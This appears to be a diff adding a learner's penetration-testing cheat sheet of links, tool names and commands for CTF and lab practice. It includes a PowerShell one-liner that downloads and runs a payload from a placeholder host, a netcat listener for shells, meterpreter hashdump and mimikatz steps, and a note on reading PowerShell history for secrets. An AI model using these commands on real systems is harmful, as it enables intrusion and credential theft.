@@ -1,0 +1,200 @@
+------------------------------------------------------------------------------------------------------
+INFO
+------------------------------------------------------------------------------------------------------
+RESOURCES
+	https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
+		common locations of log/ini/cnf/dat files
+	https://beautifier.io/
+		makes bad looking jscript look good
+	https://github.com/frizb/Hashcat-Cheatsheet
+		hashcat cheatsheet
+	https://crackstation.net/
+		basic hash cracking before breaking out john or hashcat
+	https://hausec.com/pentesting-cheatsheet/
+		just has a whole bunch of stuff
+	https://www.hackingtutorials.org/scanning-tutorials/scanning-for-smb-vulnerabilities-using-nmap/
+		nmap info
+	https://www.tutorialspoint.com/metasploit/metasploit_quick_guide.htm
+		metasploit info
+	https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+		rotten potato
+	https://hausec.com/pentesting-cheatsheet/
+	https://www.hackingtutorials.org/scanning-tutorials/scanning-for-smb-vulnerabilities-using-nmap/
+	https://www.tutorialspoint.com/metasploit/metasploit_quick_guide.htm
+
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
+
+LEARNING
+	https://academy.hackthebox.eu/dashboard
+	https://app.hackthebox.eu/home
+	https://www.tryhackme.com/dashboard
+	https://github.com/UMD-CSEC/UMDCTF-2020-Public-Challenges
+		this has old web challenges
+	dvwa
+	https://www.udemy.com/course/practical-ethical-hacking/
+	https://www.udemy.com/course/windows-privilege-escalation/
+	https://www.udemy.com/course/windows-privilege-escalation-for-beginners/
+	https://www.vulnhub.com/
+	https://www.offensive-security.com/labs/individual/
+
+tactics
+	using burp suite to repeat an http request to get a backup shell
+
+notes
+	C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+		apparently there can be console history here
+	https://github.com/securitywithoutborders/hardentools
+	wfuzz used for brute forcing usernames on a website
+	need to learn burp suite
+	https://forums.hak5.org/topic/41898-dangerous-nyancat-bootloader-overwrite/
+
+PYTHON
+	http://automatetheboringstuff.com/
+	https://projecteuler.net/
+	theres some really cool stuff you can do with XSS
+
+articles
+	https://blog.rapid7.com/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+	https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+	https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf
+
+CTFs
+	https://ctftime.org
+	https://www.majorleaguecyber.org/
+
+------------------------------------------------------------------------------------------------------
+TOOLS
+------------------------------------------------------------------------------------------------------
+
+NMAP
+	nmap -sC -sV -oA nmap/<hostname> <target ip address>
+	nmap -sV -vv --script vuln TARGET_IP
+	-p- does all ports
+
+WIRESHARK
+	https://wiki.wireshark.org/DisplayFilters
+
+TOOLS
+	https://github.com/t0thkr1s/gpp-decrypt
+		group policy preferences username and password extraction
+	https://github.com/SecureAuthCorp/impacket
+		used for elevation and getting shells in windows
+	https://bloodhound.readthedocs.io/en/latest/index.html
+		mapping out an AD domain and doing stuff
+	https://github.com/trustedsec/unicorn
+		x86 powershell injection attacks
+	https://github.com/Gallopsled/pwntools
+		pwntools
+	https://github.com/swisskyrepo/PayloadsAllTheThings
+		a bunch of payloads idk
+	wfuzz
+	gobuster
+	droopescan (github)
+		drupal? scanner
+	searchsploit
+		has exploits
+	empire
+		does exploit things
+	https://eternallybored.org/misc/netcat/
+		netcat listener for x32 and x64 windows
+	https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+		check windows for vulnerabilities
+			only for older machines? (not 10 or 2016?)
+	sherlock
+		vuln check
+	oletools
+		microsoft ole file analysis
+		https://github.com/decalage2/oletools
+			can also use apt to install
+			olevba for xlsm
+	nishang
+		shells
+	https://github.com/PowerShellMafia/PowerSploit
+		no longer updated
+	https://github.com/quentinhardy/odat
+		oracle database attacking tool
+
+NC
+	nc -lvnp 1337
+		start a listener on port 1337 with some options
+
+RDP
+	remmina
+
+METASPLOIT
+	post/multi/recon/local_exploit_suggester
+
+MSFVENOM
+	generate payload file in multiple different formats to interact with metasploit
+
+METERPRETER
+	sysinfo
+	getprivs
+	background
+	shell
+	migrate
+	getuid
+	load kiwi
+		mimikatz
+	hashdump
+	https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
+		meterpreter presistence
+
+SMB COMMANDS
+	smbclient \\\\<IP ADDRESS>\\<SHARE> -U <USERNAME>
+		put moves a file from the local box to the remote one
+	smbmap
+	sudo mount -t cifs //<IP ADDRESS>/<SHARE NAME> /mnt/smb
+		mount smb share
+
+SQL cmd line
+	select * from session_privs;
+	select * from user_role_privs;
+
+HTTP server
+	python -m SimpleHTTPServer 80
+		starts an http server in the current directory
+	IEX(New-Object Net.WebClient).DownloadString("http://<IP>:<PORT>/<PAYLOAD>") | powershell -noprofile -
+
+OPENVPN
+	sudo openvpn /path/to/file.ovpn
+
+FLAGS
+	dir /b/s *.txt
+		finds all text files in a dir tree
+
+------------------------------------------------------------------------------------------------------
+WEB
+------------------------------------------------------------------------------------------------------
+
+GOBUSTER/DIRBUSTER
+	gobuster dir -u <TARGET URL> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ./gobuster_out.txt
+	/usr/share/dirbuster/wordlists
+
+BURP
+	https://www.youtube.com/watch?v=G3hpAeoZ4ek
+		basic tutorial
+	www.dvwa.co.uk
+		for testing burp
+		can also change security level
+	setup as proxy
+	proxy window used for manipulating HTTP requests and stuff
+	set target in target>scope tab to tell burp which requests to grab
+		proxy>options tab, intercept client requests, and url is in target scope
+	in proxy>intercept tab, you can right click on a request and send to different tabs
+		also "change request method" option to change between GET and POST
+	proxy>optoins, match and replace, can emulate different kinds of devices
+	repeater tab - send a request a bunch of times, and modify a request
+		ctrl+space hotkey to send request
+		encode to different formats, can encode requests to url
+		can also encode as you type
+	comparer tab - can compare different things to find differences
+		useful if you're sifting through a lot of data
+		compare by words highlights words that are different
+	decoder tab
+		encodes and decodes between different formats
+
+XSS
+	https://youtu.be/HbzI3ubOos0
+	sublime on kali
+	payload all the things
